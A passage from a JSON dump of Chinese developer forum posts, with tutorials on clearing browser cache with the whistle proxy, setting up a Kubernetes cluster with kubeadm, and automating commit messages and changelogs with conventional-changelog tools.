<code>Cache-Control=no-cache</code></li>\n</ol>\n<p>修改这些字段后，让Server无法判断该请求是否有缓存，确保返回完整内容给客户端，而不是 <code>304</code>； 服务端再把响应头设置成不缓存即可，这样确保后续该请求可以继续发送出来，而不是直接读取客户端或浏览器的缓存，响应头的缓存配置主要涉及以下字段：</p>\n<ol>\n<li>设置 <code>Cache-Control=no-store</code></li>\n<li>设置 <code>Expires=${new Date(Date.now() - 60000000).toGMTString()}</code></li>\n<li>设置 <code>Pragma=no-cache</code></li>\n</ol>\n<p>上述操作在whistle中只需对指定请求配置一条规则即可：</p>\n<pre class=\"prettyprint language-txt\"><code>www.baidu.com&#x2F;index.html disable:&#x2F;&#x2F;cache\n</code></pre><h4>通过给请求URL加随机参数</h4>\n<p>大多数html页面考虑到实时更新的问题，一般不会设置长缓存，更多的是采用Server端响应 <code>304</code> 的方式，而很多cdn上的静态资源如js、css、图片等静态资源一般都设置了长缓存，导致这些请求根本不会发出来，所以只是通过设置请求及响应头无法彻底解决缓存问题，解决这种长缓存的资源可以给对应请求的url加随机参数。</p>\n<p>用whistle给页面的里面的js、css加随机参数，可以用<a href=\"http://wproxy.org/whistle/rules/resReplace.html\">resReplace</a>和<a href=\"http://wproxy.org/whistle/data.html\">模板字符串</a> 实现：</p>\n<pre class=\"prettyprint language-txt\"><code>&#96;&#96;&#96; replace\n&#x2F;\\.(js|css)([&#x27;&quot;])&#x2F;g: .$1?test=${now}$2\n&#96;&#96;&#96;\nwww.baidu.com&#x2F;index.html disable:&#x2F;&#x2F;cache resReplace:&#x2F;&#x2F;&#96;{replace}&#96;\n</code></pre><blockquote>\n<p>不同页面对应的正则替换 可能不一样，根据自己页面静态资源链接特点及<a href=\"http://wproxy.org/whistle/rules/resReplace.html\">resReplace</a>文档设置。</p>\n</blockquote>\n<p><img src=\"https://user-images.githubusercontent.com/11450939/49774309-47852b00-fd2f-11e8-9cee-54587f51cf13.png\" alt=\"whistle配置\">\n<img src=\"https://user-images.githubusercontent.com/11450939/49773949-1821ee80-fd2e-11e8-94ff-1bc76de93bb2.png\" alt=\"修改请求和响应头\">\n<img src=\"https://user-images.githubusercontent.com/11450939/49774071-777ffe80-fd2e-11e8-82b0-27e8bebe44cc.png\" alt=\"效果\"></p>\n<p>最后，回顾下用whistle清除页面静态资源缓存的方式：</p>\n<ol>\n<li>禁用页面 <code>304</code> 及缓存头：<a href=\"http://wproxy.org/whistle/rules/disable.html\">disable://cache</a></li>\n<li>通过正则替换给页面里面的静态资源链接加随机参数：<a href=\"http://wproxy.org/whistle/rules/resReplace.html\">resReplace</a></li>\n</ol>\n</div>","title":"用whistle清除js和css缓存","last_reply_at":"2018-12-11T03:16:41.355Z","good":false,"top":false,"reply_count":0,"visit_count":623,"create_at":"2018-12-11T03:16:41.355Z","author":{"loginname":"avwo","avatar_url":"https://avatars2.githubusercontent.com/u/11450939?v=4&s=120"}},{"id":"5c0f29f27ec239239ff5592f","author_id":"5bdb0d98646a05745b7b71f8","tab":"share","content":"<div class=\"markdown-text\"><h2>简介</h2>\n<p>kubernetes 是一款非常优秀的容器编排工具，可以管理你所有节点上的运行的 docker 容器。并且可以非常方便横向扩展、服务转移、服务升级。自从用上了 k8s 集群，再也不用担心服务单点啦～</p>\n<p>博文首发：<a href=\"http://t.v2as.com/p/use-kubeadm-install-kubernetes?c\">使用 kubeadm 搭建自己的 kubernetes 集群</a></p>\n<p><img src=\"http://upload-images.jianshu.io/upload_images/14752545-752baeb1eed5b5be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"来张首图\"></p>\n<h2>背景</h2>\n<p>前段时间刚入了 3 台服务器，都是 2核8G5M 的，近期想着要么搭建一个集群吧，正好可以体验下 <code>kubernetes</code>, 玩了这么多年的 <code>Docker</code> 都一起没有把编排工具用起来。趁这个机会实现下自己的心愿吧，以后上服务什么的也可以简化点。</p>\n<p>有了这个想法，找了个没有阳光的午后，就开始了这次搭建的旅程。</p>\n<p>由于 3 台服务器是通过不同账号买的，还有一台是腾讯的，所以用内网组集群是没有希望了，只能用公网来搭建。</p>\n<p>这其中就碰到了许多的问题，请让我慢慢道来。</p>\n<p><a href=\"https://t.2pm.me/ali\">还没有服务器？快入一台 2018 年阿里云双 12 底价服务器吧!</a></p>\n<blockquote>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/14752545-70b88d966af816ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"优惠的一小部分\"></p>\n<p><a href=\"https://t.2pm.me/ali\">查看更多</a></p>\n</blockquote>\n<h2>开始</h2>\n<h3>服务器都到位了，就可以开始这次搭建的旅程了。先看下基本信息</h3>\n<p>三台服务器都是 <code>CentOS 7.4</code> 的，当然系统环境并不能影响我们安装 <code>kubernetes</code> 的脚步。</p>\n<p>先看下基本的节点信息。<br>\n主机名称\tIP</p>\n<pre class=\"prettyprint\"><code>master\t123.123.123.123\nnode01\t123.123.123.124\nnode02\t123.123.123.125\n</code></pre><p><strong>注意</strong> : 这里对节点名有个要求，所有节点不能重名，<code>kubernetes</code><br>\n会以此名字来唯一标识这个节点。按理我们也不会设置重复的主机名。</p>\n<p>所有节点的 <code>Docker</code> 版本：<code>docker-ce 18.09.0</code><br>\n还没有安装 <code>docker</code> ? <a href=\"/p/centos-install-docker\">这个可能可以提供点帮助</a><br>\n<code>docker</code> 安装完之后，最好配置下镜像加速，加速下载镜像的速度。<br>\n可以看这文章的前半部分设置<a href=\"/p/fetch-google-image-use-tag\">使用重新打 tag 的方式，拉取 k8s.gcr.io 的镜像</a></p>\n<p><code>kubeadm</code> 是官方提供的安装集群搭建工具，使用此工具可以大大简化搭建的流程。</p>\n<p>因为我用的是外网，不方便直接写出来，所以我把我记录的步骤中的所有 <code>IP</code> 都换成了假的，仅仅是 <code>IP</code> 换了，基本的都是我实际的操作过程。</p>\n<h3>正式开始操作服务器</h3>\n<p>阿里云的机器忽略，腾讯云的机器需要关闭防火墙。</p>\n<pre class=\"prettyprint\"><code>$ systemctl stop firewalld\n$ systemctl disable firewalld\n</code></pre><h3>关闭 selinux</h3>\n<p>selinux(Security Enhance Linux): 安全加强的Linux, 安全性加强的同时，对于操作性就降低很多，因为对新用户不太友好，所以不了解的朋友可以选择关闭它。</p>\n<pre class=\"prettyprint\"><code>$ vim &#x2F;etc&#x2F;sysconfig&#x2F;selinux\n</code></pre><p>将 <code>SELINUX</code> 中的对应的配置改为 <code>SELINUX=disabled</code></p>\n<p>临时关闭 SELINUX</p>\n<pre class=\"prettyprint\"><code>$ setenforce 0\n</code></pre><p>两个操作合一起之后，当你重启的时候 <code>SELINUX</code> 依然是关闭的状态。</p>\n<h3>关闭 Swap 内存, 交换分区 Swap 就不要使用了，毕竟集群还是要稳定性为主的</h3>\n<pre class=\"prettyprint\"><code>$ swapoff -a\n</code></pre><h3>修改 linux 内核参数，阿里云的机器忽略。腾讯云的机器需要执行这一步，否则后面加入集群的时候会报这个错。</h3>\n<pre class=\"prettyprint\"><code>cat &lt;&lt;EOF &gt;  &#x2F;etc&#x2F;sysctl.d&#x2F;k8s.conf\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nEOF\n</code></pre><h3>修改完之后执行, 查看配置是否生效</h3>\n<pre class=\"prettyprint\"><code>$ sysctl --system\n</code></pre><h3>配置好所有的基本工作，下面开始安装 <code>kubectl</code> <code>kubeadm</code> <code>kubelet</code></h3>\n<ul>\n<li>kubectl : Kubectl 这个命令主要用来管理 Kubernetes 集群。</li>\n<li>kubeadm : 搭建本集群所需要的命令</li>\n<li>kubelet : kubelet 会在每个节点启动，来处理来自 Master 节点下发到本节点的任务。管理Pod和其中的容器<br>\nkubelet会在API Server上注册节点信息，定期向Master汇报节点资源使用情况，kubelet不管理不是由Kubernetes创建的容器。</li>\n</ul>\n<h3>配置 <code>kubectl</code> <code>kubeadm</code> <code>kubelet</code> 三个软件的镜像源</h3>\n<pre class=\"prettyprint\"><code>cat &lt;&lt;EOF &gt; &#x2F;etc&#x2F;yum.repos.d&#x2F;kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=https:&#x2F;&#x2F;packages.cloud.google.com&#x2F;yum&#x2F;repos&#x2F;kubernetes-el7-x86_64\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=https:&#x2F;&#x2F;packages.cloud.google.com&#x2F;yum&#x2F;doc&#x2F;yum-key.gpg https:&#x2F;&#x2F;packages.cloud.google.com&#x2F;yum&#x2F;doc&#x2F;rpm-package-key.gpg\nEOF\n</code></pre><p><strong>注意</strong> : 如果你的服务器和我一样，是国内的话除香港台湾地区<br>\n很可能是访问不了 <code>google</code> 的， 需要使用代理才能安装这三个软件<br>\n可以参照我之前的文章进行配置 <a href=\"/p/linux-shell-enable-proxy\">在 linux 服务器命令行中使用代理服务</a></p>\n<h3>开始安装，并启动 <code>kubelet</code></h3>\n<pre class=\"prettyprint\"><code>$ yum install -y kubectl kubeadm kubelet\n$ systemctl enable kubelet\n$ systemctl start kubelet\n</code></pre><p><strong>说明</strong><br>\nkubectl 是命令行工具，所以不用启动<br>\nkubeadm 是集群搭建工具，也不用启动<br>\nkubelet 是节点管理工具，需要在所有节点启动</p>\n<p><strong>注意</strong> : 以上所有教程，都需要在三台机子上操作，包括安装 <code>kubectl</code> <code>kubeadm</code> <code>kubelet</code>，启动 <code>kubelet</code></p>\n<h3>在所有机子上成功操作以上命令后，下面开始初始化主节点</h3>\n<p>在主节点上执行以下命令</p>\n<pre class=\"prettyprint\"><code>kubeadm init --pod-network-cidr=10.244.0.0&#x2F;16 --apiserver-cert-extra-sans 123.123.123.123 --apiserver-advertise-address 123.123.123.123\n</code></pre><p><strong>注意</strong><br>\n如果此条命令一直卡着，或者过了一段时间后报拉取镜像超时的问题<br>\n那么，你可以设置一下 docker 的代理，使用代理来拉取镜像。<br>\n当然你也可以使用重新 tag 的方式来拉取镜像。<br>\n参考: <a href=\"/p/fetch-google-image-use-tag\">使用重新打 tag 的方式，拉取 k8s.gcr.io 的镜像</a><br>\n当然，如果你用的和我版本一致，可以直接拉取我的镜像，或者看看有没有其它人有作了同步。</p>\n<p><strong>解释</strong></p>\n<ul>\n<li><code>kubeadm init</code> : 为初始化命令</li>\n<li><code>--pod-network-cidr=10.244.0.0/16</code> : 指定 <code>pod</code> 网络的 <code>IP</code> 地址范围。如果设置，控制平面将自动为每个节点分配 <code>CIDRs</code>。</li>\n<li><code>--apiserver-cert-extra-sans 123.123.123.123</code> : 设置了这个，之后加入节点验证证书阶段就不会报错了。\n用于API服务器服务证书的可选额外主题替代名称(SANs)。可以是 <code>IP</code> 地址和 <code>DNS</code> 名称。</li>\n<li><code>--apiserver-advertise-address 123.123.123.123</code> : 把这个设置为外网 <code>IP</code> 按理说可以实现公网组集群<br>\n可是我试了很多次都没有初始化成功，一直显示 <code>ETCD</code>启动不了，我猜可能是因为我机子上的公网并没有绑定在我服务器的网卡上，导致并不能 <code>ETCD</code> 不能监听在些 <code>IP</code>上于是我把这一条配置去掉了，后面我用了其它方法来加入集群。<br>\n<code>API</code> 服务器将通知它正在监听的IP地址。指定 <code>0.0.0.0</code> 来使用默认网络接口的地址。</li>\n</ul>\n<h3>不出意外的话，你可能会看到如下的输出：</h3>\n<pre class=\"prettyprint\"><code># 这之前的就忽略吧\n...\n[addons] Applied essential addon: CoreDNS\n[addons] Applied essential addon: kube-proxy\n\nYour Kubernetes master has initialized successfully!\n\nTo start using your cluster, you need to run the following as a regular user:\n\n  mkdir -p $HOME&#x2F;.kube\n  sudo cp -i &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf $HOME&#x2F;.kube&#x2F;config\n  sudo chown $(id -u):$(id -g) $HOME&#x2F;.kube&#x2F;config\n\nYou should now deploy a pod network to the cluster.\nRun &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:\n  https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;concepts&#x2F;cluster-administration&#x2F;addons&#x2F;\n\nYou can now join any number of machines by running the following on each node\nas root:\n\n  kubeadm join 192.168.0.1:6443 --token 1fmns7.rgtgtpmkxskfagck --discovery-token-ca-cert-hash sha256:d8e62583fc2b88cb9f866a1b35e279a8668e13537404c837f14f2c6cda037674\n</code></pre><p>这里需要你去执行, 可能你的输出和我不一致，请复制你自己的</p>\n<pre class=\"prettyprint\"><code>$ mkdir -p $HOME&#x2F;.kube\n$ sudo cp -i &#x2F;etc&#x2F;kubernetes&#x2F;admin.conf $HOME&#x2F;.kube&#x2F;config\n$ sudo chown $(id -u):$(id -g) $HOME&#x2F;.kube&#x2F;config\n</code></pre><h3>安装 <code>pod</code> 网络附加组件 <code>flannel</code></h3>\n<pre class=\"prettyprint\"><code>$ kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;coreos&#x2F;flannel&#x2F;master&#x2F;Documentation&#x2F;kube-flannel.yml\n</code></pre><h3>查看主节点信息 <code>kubectl get pods --all-namespaces</code></h3>\n<pre class=\"prettyprint\"><code>[root@master ~]# kubectl get pods --all-namespaces\nNAMESPACE     NAME                                    READY   STATUS             RESTARTS   AGE\nkube-system   coredns-86c58d9df4-4gs57                1&#x2F;1     Running             0          1h\nkube-system   coredns-86c58d9df4-7g5kx                1&#x2F;1     Running             0          1h\nkube-system   etcd-master                             1&#x2F;1     Running             0          1h\nkube-system   kube-apiserver-master                   1&#x2F;1     Running             0          1h\nkube-system   kube-controller-manager-master          1&#x2F;1     Running             2          1h\nkube-system   kube-flannel-ds-amd64-c69hl             1&#x2F;1     Running             0          1h\nkube-system   kube-flannel-ds-amd64-nq7s5             1&#x2F;1     Running             0          1h\nkube-system   kube-flannel-ds-amd64-xg7ct             1&#x2F;1     Running             0          1h\nkube-system   kube-proxy-n27rj                        1&#x2F;1     Running             0          1h\nkube-system   kube-proxy-tj2xj                        1&#x2F;1     Running\t\t      0          1h\nkube-system   kube-proxy-zx7d8                        1&#x2F;1     Running\t\t      0          1h\nkube-system   kube-scheduler-master                   1&#x2F;1     Running             1          1h\n</code></pre><p>最后，你可以看到一行加入集群的命令:</p>\n<pre class=\"prettyprint\"><code>$ kubeadm join 192.168.0.1:6443 --token 1fmns7.rgtgtpmkxskfagck --discovery-token-ca-cert-hash sha256:d8e62583fc2b88cb9f866a1b35e279a8668e13537404c837f14f2c6cda037674\n</code></pre><p>只要在其它两个节点上执行这一命令，你就可以把执行的服务器那台服务加入集群了。</p>\n<p><strong>注意</strong><br>\n因为我在初始化阶段去掉了 <code>--apiserver-advertise-address 123.123.123.123</code> 这个配置，所以当前加入集群的命令给我展示了内网的 IP <code>192.168.0.1:6443</code><br>\n由于我 3 台机子是不互通的，于是我只能在其它机器上用 <code>iptables</code> 作了 <code>IP</code> 转发<br>\n具体可参考文章: <a href=\"/p/iptables-redirect-ip\">使用 iptables 将 IP 重定向</a><br>\n这样，我也成功得加入到集群了。如果有什么好的方法，请和我也说说。</p>\n<h3>在每个节点执行，如果内网不通，可参照上面注意部分</h3>\n<pre class=\"prettyprint\"><code>$ kubeadm join 192.168.0.1:6443 --token 1fmns7.rgtgtpmkxskfagck --discovery-token-ca-cert-hash sha256:d8e62583fc2b88cb9f866a1b35e279a8668e13537404c837f14f2c6cda037674\n</code></pre><h3>上面命令执行成功后，你就完成了集群的搭建工作了。</h3>\n<h3>不过，如果由于其它原因，或者想再搭建一次，可以执行 <code>reset</code> 操作，重置所有配置，恢复到刚安装好 <code>kubectl</code> <code>kubeadm</code> <code>kubelet</code> 的状态，再来一次。我就执行了这个命令不下 20 次</h3>\n<pre class=\"prettyprint\"><code>$ kubeadm reset\n</code></pre><p>此命令会把所有启动的镜像全部删除，还会删除一些生成的配置文件。但是都是执行 <code>init</code> 生成的，所以删了也没有关系。</p>\n<h3>节点加入集群完成后，在主节点通过 <code>kubectl get nodes</code> 查看节点信息</h3>\n<pre class=\"prettyprint\"><code>[root@master ~]# kubectl get nodes\nNAME     STATUS     ROLES    AGE  VERSION\nnode01   NotReady   &lt;none&gt;   1h   v1.13.0\nnode02   NotReady   &lt;none&gt;   1h   v1.13.0\nmaster   Ready      master   1h   v1.13.0\n[root@master ~]#\n</code></pre><h2>小结</h2>\n<p>到这里，你已经搭建好了集群。下一步，就可以尽情得玩耍了。</p>\n<p>对于我，我则想先从下面三个方向入手。</p>\n<ul>\n<li>Web UI (Dashboard) : kubernetes 的管理面板</li>\n<li>Kubernetes Ingress Controller : Kubernetes + Traefik</li>\n<li>监控 : Grafana + Prometheus 监控 Kubernetes 及集群内其它服务</li>\n</ul>\n<p>主要从上面三个点来玩 <code>Kubernetes</code> 加油～</p>\n</div>","title":"搭建自己的集群，使用 kubeadm 搭建自己的 kubernetes 集群","last_reply_at":"2018-12-11T03:07:30.506Z","good":false,"top":false,"reply_count":0,"visit_count":694,"create_at":"2018-12-11T03:07:30.506Z","author":{"loginname":"vyf","avatar_url":"https://avatars0.githubusercontent.com/u/33199055?v=4&s=120"}},{"id":"5c0bcaeff3d48d2397c0f446","author_id":"53f30d44bbdaa79d51516b11","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>一直以来，因为团队项目迭代节奏很快，每次发布的更新日志和版本更新都是通过人肉来完成的。有时候实在忙的团团转，对于手动的写这些更新信息就显得力不从心了。对于团队新来的小伙伴，有时候遇到些紧急情况，就更显的乱糟糟，还是得麻烦团队资深的同学。显然这些工作，用自动化工具再适合不过了。 &lt;br/&gt;</p>\n</blockquote>\n<p>本文是一篇项目自动化方面的使用教程，社区里面针对四类问题的解决方案很多，今天这里主要介绍的是 <a href=\"https://github.com/conventional-changelog\">conventional-changelog</a> 方案相关的内容。\n如果你正在思考或者试图解决这方面的问题的话，不妨了解一下。</p>\n<h1>conventional-changelog</h1>\n<p><a href=\"https://github.com/conventional-changelog\">onventional-changelog</a> 是一款可以根据项目的<code>commit</code> 和 <code>metadata</code>信息自动生成 <code>changelogs</code> 和 <code>release notes</code>的系列工具，并且在辅助 <a href=\"https://github.com/conventional-changelog/standard-version\">standard-version</a> 工具的情况下，可以自动帮你完成生成<code>version</code>、打<code>tag</code>, 生成<code>CHANGELOG</code>等系列过程。</p>\n<h3>conventional-changelog 生态主要模块</h3>\n<ul>\n<li><a href=\"https://github.com/conventional-changelog/conventional-changelog/tree/master/packages/conventional-changelog-cli\">conventional-changelog-cli</a> - conventional-changelog 核心命令行工具</li>\n<li><a href=\"https://github.com/conventional-changelog/conventional-changelog/tree/master/packages/standard-changelog\">standard-changelog</a> - 针对 angular commit 格式的命令行工具</li>\n<li><a href=\"https://github.com/conventional-changelog/conventional-github-releaser\">conventional-github-releaser</a> - 利用 git metadata 针对 Github 的发布工具</li>\n<li><a href=\"https://github.com/conventional-changelog/conventional-commits-detector\">conventional-commits-detector</a> - commit message 规范引用检测</li>\n<li><a href=\"https://github.com/commitizen/cz-cli\">commitizen</a> - 针对开发者简单的 commit 规范</li>\n<li><a href=\"https://github.com/marionebl/commitlint\">commitlint</a> - commit Lint 工具</li>\n</ul>\n<p>以上是 <a href=\"https://github.com/conventional-changelog\">onventional-changelog</a> 生态重要的几个主要模块，实际工作中这几个工具常常是配套使用的，当然也需要根据自己的情况而定。篇幅有限，今天我们就主要介绍 <a href=\"https://github.com/commitizen/cz-cli\">commitizen</a>、<a href=\"https://github.com/conventional-changelog/conventional-changelog/tree/master/packages/conventional-changelog-cli\">conventional-changelog-cli</a> 、<a href=\"https://github.com/conventional-changelog/standard-version\">standard-version</a> 这三工具了。</p>\n<h1>commitizen</h1>\n<p><a href=\"https://github.com/commitizen/cz-cli\">commitizen</a> 是一款标准化 git commit 信息的工具。在没有规范的情况下，开发人员的 commit 信息是常常是随意的，这就导致 commit 信息显的很无用。可是当你在做<code>git log</code> 、<code>code review</code>、编写<code>changelog</code>等情况时，良好的 commit 规范就显的尤为重要。</p>\n<h5>commitizen 安装</h5>\n<pre class=\"prettyprint language-bash\"><code>$ npm install -g commitizen\n# 或者本地安装\n$ npm install --save-dev commitizen\n</code></pre><h5>安装适配器（Adapter)</h5>\n<p>因为不同的项目本身的构建方式的不同，commitizen 支持不同适配器的扩展，从而去满足不同的构建需求的。本文主要使用<code>cz-conventional-changelog</code>的构建标准，当然你也可以根据具体的情况选择其他的适配器，更多<a href=\"https://github.com/commitizen/cz-cli\">请看</a>。</p>\n<pre class=\"prettyprint language-bash\"><code>$ npm install -g cz-conventional-changelog\n</code></pre><p>全局安装完成后，我们需要在项目根目录下添加 <code>.czrc</code> 配置文件，文件内容如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; path 用来指定适配器\n{ &quot;path&quot;: &quot;cz-conventional-changelog&quot; }\n</code></pre><h5>本地安装</h5>\n<pre class=\"prettyprint language-bash\"><code>$ npm install cz-conventional-changelog --save-dev\n# 或者使用 commitizen 工具\n$ commitizen init cz-conventional-changelog --save-dev --save-exact\n</code></pre><p>commitizen 工具会自动在<code>package.json</code>中添加配置相应的配置，具体如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>  &quot;config&quot;: {\n    &quot;commitizen&quot;: {\n      &quot;path&quot;: &quot;cz-conventional-changelog&quot;\n    }\n  }\n</code></pre><p>安装并添加完后，我们便可以使用 <code>git cz</code> 命令替换 <code>git commit</code> 来使用了。我们修改一个文件并 <code>git add</code> 后，通过 <code>git cz</code> 试一下：</p>\n<p><img src=\"https://note.youdao.com/yws/api/personal/file/WEBee9436ba77018d27cadecd21329dfd0c?method=download&amp;shareKey=927efb864ac48fcc6e0175bc35d0ed97\" alt=\"git-cz\"></p>\n<p>可以看到，git cz 给出了 commit 的几种类型选项，如下：</p>\n<ul>\n<li>feat 新功能</li>\n<li>fix  Bug 修复</li>\n<li>docs 文档更新</li>\n<li>style 代码的格式，标点符号的更新</li>\n<li>refactor 代码重构</li>\n<li>perf 性能优化</li>\n<li>test 测试更新</li>\n<li>build 构建系统或者包依赖更新</li>\n<li>ci CI 配置，脚本文件等更新</li>\n<li>chore 非 src 或者 测试文件的更新</li>\n<li>revert commit 回退</li>\n</ul>\n<p>使用的时候，我们应该根据项目具体变更情况选择。如果想修改已经打好的 commit 信息，我们可以通过 <code>git reset</code>命令来修复。</p>\n<p>需要注意的是，仅仅是添加 commit 工具是不够的，为了保证 commit 格式的一致性，这里强烈建议你记得整合 <a href=\"https://github.com/marionebl/commitlint\">commitlint</a> 工具, 配合 <a href=\"https://github.com/typicode/husky\">git commit-msg hook</a> 来使用，在这里就不相信介绍了，具体可以查看官方文档。</p>\n<h2>conventional-changelog-cli</h2>\n<p><a href=\"https://github.com/conventional-changelog/conventional-changelog/tree/master/packages/conventional-changelog-cli\">conventional-changelog-cli</a>  默认推荐的 commit 标准是来自<code>angular</code>项目,除了 angular 标准以外，目前集成了包括 <code>atom, codemirror, ember, eslint, express, jquery</code> 等项目的标准，具体可以根据自己口味来选用。</p>\n<h5>安装</h5>\n<pre class=\"prettyprint language-bash\"><code># Help conventional-changelog --help\n$ npm install -g conventional-changelog-cli\n</code></pre><h4>基本使用</h4>\n<pre class=\"prettyprint language-bash\"><code>$ conventional-changelog -p angular -i CHANGELOG.md -s\n</code></pre><p>以上命令中参数<code>-p angular</code>用来指定使用的 commit message 标准，假如想使用<code>atom</code>的标准，则是：</p>\n<pre class=\"prettyprint language-bash\"><code>$ conventional-changelog -p atom -i CHANGELOG.md -s\n</code></pre><p>参数<code>-i CHANGELOG.md</code>表示从 <a href=\"http://CHANGELOG.md\">CHANGELOG.md</a> 读取 changelog, <code>-s</code> 表示读写 changelog 为同一文件。需要注意的是，上面这条命令产生的 changelog 是基于上次 tag 版本之后的变更（Feature、Fix、Breaking Changes等等）所产生的，所以如果你想生成之前所有 commit 信息产生的 changelog 则需要使用这条命令：</p>\n<pre class=\"prettyprint language-bash\"><code>$ conventional-changelog -p angular -i CHANGELOG.md -s -r 0\n</code></pre><p>其中 <code>-r</code> 表示生成 changelog 所需要使用的 release 版本数量，默认为1，全部则是0。</p>\n<h4>自定义参数</h4>\n<p>生成的 changlog 中有些常用内容可以通过自定义参数来根据需求更改，例如版本号、commit 地址等等。\nchangelog 中生成的版本号即是从 <code>package.json</code> 中获取 version 字段来的。commit 连接的仓库地址我们需要修改 <code>package.json</code> 中的<code>repository</code>地址，changelog 中 issuse 默认的连接地址也是根据 <code>repository</code> 来生成的。如果你使用了第三方的协作系统（例如 bitbucket）， 那么你可以使用这个标准<a href=\"https://github.com/uglow/conventional-changelog-angular-bitbucket\">conventional-changelog-angular-bitbucket</a>。或者像我们使用 redmine 来管理 isssue ，那么在生成 changelog 后可以使用 <a href=\"https://www.npmjs.com/package/replace\">replace</a> 工具来处理文本中的原有地址：</p>\n<pre class=\"prettyprint language-bash\"><code>$ replace &#x27;https:&#x2F;&#x2F;github.com&#x2F;myproject&#x2F;issues&#x2F;&#x27; &#x27;https:&#x2F;&#x2F;redmine.example.com&#x27; CHANGELOG.md\n</code></pre><p>最后看看大致生成的效果：</p>\n<p><img src=\"https://note.youdao.com/yws/api/personal/file/WEB60476802c9725abcedd80a5e78a8024f?method=download&amp;shareKey=afee20905f1805a5e6cab8168d97bca6\" alt=\"changelog\"></p>\n<p>conventional-changelog 更多的选项配置可以看<a href=\"https://github.com/conventional-changelog/conventional-changelog/tree/master/packages/conventional-changelog-core\">这里。</a></p>\n<h1>standard-version</h1>\n<p><a href=\"https://github.com/conventional-changelog/standard-version\">standard-version</a> 是一款遵循<a href=\"https://semver.org/\">语义化版本（ semver）</a>和 <a href=\"https://conventionalcommits.org/\">commit message 标准规范</a> 的版本和 changlog 自动化工具。通常情况线下，我们会在 master 分支进行如下的版本发布操作：</p>\n<pre class=\"prettyprint language-bash\"><code>1. git pull origin master\n2. 根据 pacakage.json 中的 version 更新版本号，更新 changelog\n3. git add -A, 然后 git commit\n4. git tag 打版本操作\n5. push 版本 tag 和 master 分支到仓库\n</code></pre><p>其中2，3，4则是 standard-version 工具会自动完成的工作，配合本地的 shell 脚本，则可以自动完成一系列版本发布的工作了。</p>\n<h4>安装 &amp; 使用</h4>\n<p>在这里我仍然推荐的全局安装：</p>\n<pre class=\"prettyprint language-bash\"><code>$ npm install -g standard-version\n# 或者\n$ npm install --save-dev standard-version\n</code></pre><p>执行：</p>\n<pre class=\"prettyprint language-bash\"><code># Help standard-version --help\n$ standard-version \n</code></pre><p>执行 standard-version 命令，我们会在控制台看到整个执行流程的 log 信息，在这里几个常用的参数需要注意下:</p>\n<h5>–release-as, -r 指定版本号</h5>\n<p>默认情况下，工具会自动根据 主版本（major）,次版本（ minor） or 修订版（patch） 规则生成版本号，例如如果你package.json 中的version 为 1.0.0, 那么执行后版本号则是：1.0.1。自定义可以通过：</p>\n<pre class=\"prettyprint language-bash\"><code>$ standard-version -r minor\n# output 1.1.0\n$ standard-version -r 2.0.0\n# output 2.0.0\n$ standard-version -r 2.0.0-test\n# output 2.0.0-test\n</code></pre><p>需要注意的是，这里的版本名称不是随便的字符，而是需要遵循<a href=\"https://semver.org/\">语义化版本（ semver）</a> 规范的</p>\n<h5>–prerelease, -p 预发版本命名</h5>\n<p>用来生成预发版本, 如果当期的版本号是 2.0.0，例如</p>\n<pre class=\"prettyprint language-bash\"><code>$ standard-version --prerelease alpha\n# output 2.0.0-alpha.0\n</code></pre><h5>–tag-prefix, -t 版本 tag 前缀</h5>\n<p>用来给生成 tag 标签添加前缀，例如如果前版本号为 2.0.0，则：</p>\n<pre class=\"prettyprint language-bash\"><code>$ standard-version --tag-prefix &quot;stable-&quot;\n# output tag: stable-v2.0.0\n</code></pre><p>以上这几个参数可能我们用的比较多，还有其他选项可以通过 <code>standard-version --help</code> 查看。</p>\n<h4>集成 npm</h4>\n<p>最后记得把命令集成到 npm <code>package.json</code>的 scripts 中, 并配合 shell 脚本使用, 如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&quot;scripts&quot;: {\n    &quot;release&quot;: &quot;.&#x2F;scripts&#x2F;release.sh&quot;,\n    &quot;changelog&quot;: &quot;conventional-changelog -p angular -i CHANGELOG.md -s -r 0 &amp;&amp; git add CHANGELOG.md &amp;&amp; npm run changeissueurl&quot;,\n    &quot;changeissueurl&quot;: &quot;replace &#x27;https:&#x2F;&#x2F;github.com&#x2F;myproject&#x2F;issues&#x2F;&#x27; &#x27;https:&#x2F;&#x2F;redmine.example.com&#x2F;&#x27; CHANGELOG.md&quot;\n  },\n  \n&#x2F;&#x2F; 配置好后使用 npm run 执行发布\n$ npm run release\n</code></pre><p>添加 <code>release.sh</code> 脚本：</p>\n<pre class=\"prettyprint language-bash\"><code>#!&#x2F;bin&#x2F;bash\n\n# Release branch\nmaster=&quot;master&quot;\nprefix=&quot;DTinsight_v&quot;\n\ngit pull origin $master\necho &quot;Current pull origin $master.&quot;\n\n# Auto generate version number and tag\nstandard-version -r $release --tag-prefix $prefix\n\ngit push --follow-tags origin $master\n\necho &quot;Git push origin $master&quot;\necho &quot;Release finished.&quot;\n</code></pre><p>上面的脚本只是做了简单的分支 <code>pull</code>,  执行 <code>standard-version</code> 和最后的版本 <code>push</code> 工作，如果要做一些定制化的执行参数，则需要做定制修改了。</p>\n<h2>最后</h2>\n<p>项目的工程化是一件很有意思的事情，通过自动化的工具，可以有效提升项目可维护性和质量，并且避免很多不确定因素。如果你工作中发现了这些问题，而不想继续通过人肉的方法解决这些问题的话，那就赶紧试试~</p>\n<blockquote>\n<p>原文地址：<a href=\"http://imziv.com/blog/article/index.htm\">http://imziv.com/blog/article/index.htm</a></p>\n</blockquote>\n</div>","title":"git commit 、CHANGELOG 